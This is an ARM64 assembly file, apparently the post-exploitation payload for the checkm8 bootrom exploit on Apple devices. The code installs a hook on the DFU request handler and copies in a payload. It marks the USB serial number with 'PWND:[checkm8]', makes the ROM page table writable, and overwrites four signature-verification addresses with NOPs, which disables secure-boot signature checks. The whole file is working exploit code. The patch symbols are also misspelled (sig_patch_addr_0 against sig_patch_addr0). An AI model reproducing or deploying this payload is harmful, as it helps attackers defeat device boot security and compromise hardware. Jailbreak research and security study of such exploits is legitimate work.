/* Copyright 2022 0x7ff
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
.text
.align 2

.pool
.set payload_dest,                        0x7FFFFFF0
.set dfu_handle_request,                  0x7FFFFFF1
.set payload_off,                         0x7FFFFFF2
.set payload_sz,                          0x7FFFFFF3
.set memcpy_addr,                         0x7FFFFFF4
.set gUSBSerialNumber,                    0x7FFFFFF5
.set usb_create_string_descriptor,        0x7FFFFFF6
.set usb_serial_number_string_descriptor, 0x7FFFFFF7
.set ttbr0_vrom_addr,                     0x7FFFFFF8
.set sig_patch_addr0,                     0x7FFFFFF9
.set sig_patch_addr1,                     0x7FFFFFFA
.set sig_patch_addr2,                     0x7FFFFFFB
.set sig_patch_addr3,                     0x7FFFFFFC
.set total_received,                      0x7FFFFFFD

.global _main
_main:
	stp x29, x30, [sp, #-0x10]!
	ldr x0, =payload_dest
	ldr x3, =dfu_handle_request
	add x1, x0, #0xC
	str x1, [x3]
	adr x1, _main
	ldr x2, =payload_off
	add x1, x1, x2
	ldr x2, =payload_sz
	ldr x3, =memcpy_addr
	blr x3
	ldr x0, =gUSBSerialNumber
_find_zero_loop:
	add x0, x0, #1
	ldrb w1, [x0]
	cbnz w1, _find_zero_loop
	adr x1, PWND_STR
	ldp x2, x3, [x1]
	stp x2, x3, [x0]
	ldr x0, =gUSBSerialNumber
	ldr x1, =usb_create_string_descriptor
	blr x1
	ldr x1, =usb_serial_number_string_descriptor
	strb w0, [x1]

        ; disable interrupts

        msr     daifset, #0x3
        isb

	ldr x0, =ttbr0_vrom_addr
	ldr x1, [x0]
	bic x1, x1, #0xC0
	str x1, [x0]

        ; flush page table
	dsb sy
	tlbi alle3
	dsb sy
	isb

        ; nop
        mov w2, #0x201f
        movk w2, #0xd503, lsl #16

	ldr x3, =sig_patch_addr_0
	str w2, [x3]

        ldr x3, =sig_patch_addr_1
        str w2, [x3]

        ldr x3, =sig_patch_addr_2
        str w2, [x3]

        ldr x3, =sig_patch_addr_3
        str w2, [x3]

	orr x1, x1, #0x80
	str x1, [x0]

        ; flush page table
	dsb sy
	tlbi alle3
	dsb sy
	isb

        ; enable interupts
        msr     daifclr, #0x3
        isb

	ldr x0, =total_received
	str wzr, [x0]
	ldp x29, x30, [sp], #0x10
	ret

.align 4
PWND_STR:
.asciz " PWND:[checkm8]"

